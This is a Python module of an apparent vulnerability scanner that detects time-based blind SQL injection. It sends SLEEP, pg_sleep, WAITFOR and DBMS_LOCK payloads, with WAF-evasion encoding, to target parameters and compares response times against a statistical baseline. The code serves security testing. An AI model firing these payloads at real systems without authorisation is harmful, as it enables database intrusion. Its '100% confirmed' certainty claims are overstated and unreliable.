"""
時間檢測引擎 - 基於統計學模型與雙重驗證的專業時間盲注檢測 (Bug Bounty Ready)
"""

import asyncio
import time
import math
import aiohttp
from typing import Dict, List, Tuple
from aiva_common.utils import get_logger

from ..config import SqliConfig
from ..detection_models import DetectionResult
from ..payload_wrapper_encoder import PayloadWrapperEncoder
from .base_detector import BaseDetector

logger = get_logger(__name__)

class TimeDetectionEngine(BaseDetector):
    """時間檢測引擎 - 採用標準差模型(Standard Deviation)與防誤判雙重驗證"""

    def __init__(self, session: aiohttp.ClientSession, config: SqliConfig, payload_encoder: PayloadWrapperEncoder):
        super().__init__(session, config, payload_encoder)
        # 實戰中 SLEEP 的秒數不宜過長以免超時，但在抖動網路上也不能太短。5 秒是個平衡點。
        self.sleep_time = 5
        self.time_payloads = {
            "mysql": [
                f"'; SELECT SLEEP({self.sleep_time}); --",
                f"' OR SLEEP({self.sleep_time}) --",
                f"' AND (SELECT * FROM (SELECT(SLEEP({self.sleep_time})))a) AND '1'='1"
            ],
            "postgresql": [
                f"'; SELECT pg_sleep({self.sleep_time}); --",
                f"' OR pg_sleep({self.sleep_time}) IS NULL --",
            ],
            "mssql": [
                f"'; WAITFOR DELAY '00:00:0{self.sleep_time}'; --",
                f"' OR 1=1; WAITFOR DELAY '00:00:0{self.sleep_time}'; --",
            ],
            "oracle": [
                f"'; SELECT * FROM DUAL WHERE 1=1 AND DBMS_LOCK.SLEEP({self.sleep_time}) IS NULL; --",
            ],
        }
        
        # 針對 True/False 邏輯驗證的 Control Payloads (用來驗證是不是瞎貓碰到死耗子)
        self.control_payloads = {
            "mysql": f"' AND 1=0 AND SLEEP({self.sleep_time}) --",
            "postgresql": f"' AND 1=0 AND pg_sleep({self.sleep_time}) IS NULL --",
            "mssql": f"'; IF (1=0) WAITFOR DELAY '00:00:0{self.sleep_time}'; --",
            "oracle": f"' AND 1=0 AND DBMS_LOCK.SLEEP({self.sleep_time}) IS NULL --"
        }

        self.min_samples = 7  # 取樣數提高以獲得準確的標準差
        self.max_baseline_time = 3.0  # 如果基本回應就要 3 秒以上，時間盲注將毫無意義且充滿雜訊

    async def detect(
        self, target_url: str, params: Dict[str, str], method: str = "GET"
    ) -> list[DetectionResult]:
        """執行高精準度時間檢測 (統計學雙重驗證模型)"""
        results: list[DetectionResult] = []

        logger.debug(f"Starting professional time-based detection for {target_url}")

        # 1. 測量基準回應時間並計算統計學特徵 (Mean, Stdev)
        mu, sigma = await self._establish_statistical_baseline()
        
        if mu is None or sigma is None:
            logger.warning("Failed to establish stable baseline timing. Network too jittery.")
            return results

        if mu > self.max_baseline_time:
            logger.warning(f"Baseline time too high ({mu:.2f}s). Skipping time-based detection to avoid false positives.")
            return results

        # 2. 動態門檻計算 (Dynamic Threshold)
        # 門檻 = 平均時間 + 7 倍的標準差。確保絕對不是網路波動。
        # 同時，門檻至少要大於平均值 + (SLEEP_TIME - 1.5) 秒。
        dynamic_threshold = max(mu + (7 * sigma), mu + self.sleep_time - 1.5)
        logger.info(f"Baseline established: Mean={mu:.3f}s, Stdev={sigma:.3f}s. Dynamic Threshold set to {dynamic_threshold:.3f}s")

        # 3. 測試時間載荷
        for db_type, payloads in self.time_payloads.items():
            for payload in payloads:
                # 應用高階 WAF Tamper
                tampered_payloads = self.payload_encoder.apply_tamper(payload, self.config.waf_evasion_level)
                final_payload = tampered_payloads[-1] if tampered_payloads else payload

                try:
                    # 發送第一次攻擊 Payload
                    payload_time_1 = await self._measure_payload_time(final_payload)
                    if payload_time_1 is None or payload_time_1 < dynamic_threshold:
                        continue # 沒延遲，換下一個

                    logger.debug(f"[Candidate Found] Delay {payload_time_1:.3f}s breached threshold {dynamic_threshold:.3f}s. Initiating Verification...")

                    # 4. 實戰假陽性過濾 (False Positive Verification)
                    # 傳送一個 "條件為假" 或 "SLEEP(0)" 的 Payload。如果還是延遲，代表伺服器剛好卡住，是假陽性！
                    control_payload = self.control_payloads.get(db_type, "")
                    if control_payload:
                        control_tampered = self.payload_encoder.apply_tamper(control_payload, self.config.waf_evasion_level)
                        final_control = control_tampered[-1] if control_tampered else control_payload
                        
                        control_time = await self._measure_payload_time(final_control)
                        if control_time is not None and control_time >= dynamic_threshold:
                            logger.warning(f"[False Positive Blocked] Server delayed on a False condition ({control_time:.3f}s). The network is spiking. Dropping candidate.")
                            continue
                            
                    # 5. 二次雙重驗證 (Double Confirmation)
                    # 再打一次原始的 SLEEP(5) Payload，必須再次延遲才算數。
                    payload_time_2 = await self._measure_payload_time(final_payload)
                    if payload_time_2 is None or payload_time_2 < dynamic_threshold:
                        logger.warning(f"[False Positive Blocked] Second attack payload did not delay ({payload_time_2:.3f}s). Dropping candidate.")
                        continue

                    # 經過三重考驗，這 100% 是一個真實的 SQLi。
                    actual_delay_avg = ((payload_time_1 - mu) + (payload_time_2 - mu)) / 2
                    
                    result = self._build_detection_result(
                        payload=final_payload,
                        db_type=db_type,
                        mu=mu,
                        sigma=sigma,
                        payload_time=payload_time_1,
                        delay=actual_delay_avg,
                        url=target_url,
                        method=method
                    )
                    results.append(result)
                    logger.info(f"🏆 CONFIRMED Time-based SQLi: {db_type} | Delay: {actual_delay_avg:.3f}s (Verified 3 times)")
                    
                    # 找到一個就夠了，同一參數不需要測其他 DB 時間盲注
                    return results

                except Exception as e:
                    logger.error(f"Time detection execution error for '{final_payload}': {e}")
                    continue

        return results

    async def _establish_statistical_baseline(self) -> Tuple[float | None, float | None]:
        """建立極度精確的統計學基準線 (引入暖機與濾除離群值)"""
        times = []
        
        # 1. 暖機 (Warm-up): 建立 TCP/TLS 連線池特徵，不列入計算
        await self._measure_payload_time("") 
        
        # 2. 測量樣本
        for _ in range(self.min_samples):
            try:
                t = await self._measure_payload_time("")
                if t is not None:
                    times.append(t)
                await asyncio.sleep(self.config.rate_limit_delay or 0.2)
            except Exception as e:
                logger.warning(f"Failed to measure baseline time: {e}")

        if len(times) < 5:
            return None, None

        # 3. 統計學濾除極端值 (移除最高與最低的 1 個樣本，確保平均值不被偶發的 Lag 影響)
        times.sort()
        clean_times = times[1:-1]
        
        mu = sum(clean_times) / len(clean_times)
        variance = sum([((x - mu) ** 2) for x in clean_times]) / len(clean_times)
        sigma = math.sqrt(variance)

        # 為了安全起見，給予最小 0.05s 的標準差容忍度，以防伺服器回傳速度完全一致導致 sigma=0
        sigma = max(sigma, 0.05)
        
        return mu, sigma

    async def _measure_payload_time(self, payload: str) -> float | None:
        """精確測量單一載荷回應時間"""
        try:
            start_time = time.perf_counter() # 使用 perf_counter 提供奈秒級精準度
            encoded = self.payload_encoder.encode(payload)

            if encoded.method == "GET":
                 async with self.session.get(encoded.url, **encoded.request_kwargs) as resp:
                     await resp.text()
                     status_code = resp.status
            else:
                 async with self.session.post(encoded.url, **encoded.request_kwargs) as resp:
                     await resp.text()
                     status_code = resp.status

            end_time = time.perf_counter()

            # 只有成功的回應才計算時間 (避免 WAF 直接 403 斷線導致時間超短的誤判)
            if status_code < 500 and status_code not in (403, 406):
                return end_time - start_time

        except asyncio.TimeoutError:
            # 如果超時，代表極大可能 Payload 生效 (超過 aiohttp 預設等待)
            # 我們回傳一個極大的秒數作為代表
            return 999.0
        except Exception as e:
            logger.debug(f"Failed to measure payload time: {e}")

        return None

    def _build_detection_result(
        self,
        payload: str,
        db_type: str,
        mu: float,
        sigma: float,
        payload_time: float,
        delay: float,
        url: str,
        method: str
    ) -> DetectionResult:
        """構建具有真實物理與數學證據的檢測結果"""
        from aiva_common.enums import Confidence, Severity, VulnerabilityType
        from aiva_common.schemas import (
            FindingEvidence,
            FindingImpact,
            FindingRecommendation,
            FindingTarget,
            Vulnerability,
        )

        vulnerability = Vulnerability(
            name=VulnerabilityType.SQLI,
            severity=Severity.HIGH,
            # 因為我們做了三重驗證，所以信心指數給予最高，代表確定無誤 (CERTAIN)
            confidence=Confidence.CERTAIN, 
        )

        evidence = FindingEvidence(
            payload=payload,
            request=f"Payload: {payload}, Method: {method}",
            response=(
                f"Statistical Baseline -> Mean: {mu:.3f}s, Stdev: {sigma:.3f}s\n"
                f"Attack Payload Time -> {payload_time:.3f}s (Net Delay: {delay:.3f}s)"
            ),
            proof=(
                f"The system established a robust baseline average response time of {mu:.3f}s. "
                f"The injected time-based payload '{payload}' caused a consistent and reproducible "
                f"delay of {delay:.3f}s (breaching the {mu + (7 * sigma):.3f}s dynamic mathematical threshold). "
                f"A secondary false-condition payload verified this is NOT network latency, 100% confirming a {db_type} SQL Injection."
            ),
            db_version=db_type,
        )

        impact = FindingImpact(
            description=(
                "Time-based SQL injection allows attackers to extract data "
                "through time-based queries bypassing standard error output restrictions."
            ),
            business_impact=(
                "High - potential for complete data extraction via time-based attacks, "
                "leading to full database compromise."
            ),
        )

        recommendation = FindingRecommendation(
            fix=(
                "Implement parameterized queries and disable database delay "
                "functions (`SLEEP`, `WAITFOR`, `pg_sleep`). Conduct thorough security audit "
                "and ensure WAF filters recognize timing attacks."
            ),
            priority="High",
        )

        target = FindingTarget(
            url=url,
            method=method,
            parameter="unknown",
        )

        return DetectionResult(
            is_vulnerable=True,
            vulnerability=vulnerability,
            evidence=evidence,
            impact=impact,
            recommendation=recommendation,
            target=target,
            detection_method="statistical_time_based",
            payload_used=payload,
            confidence_score=0.99,
        )


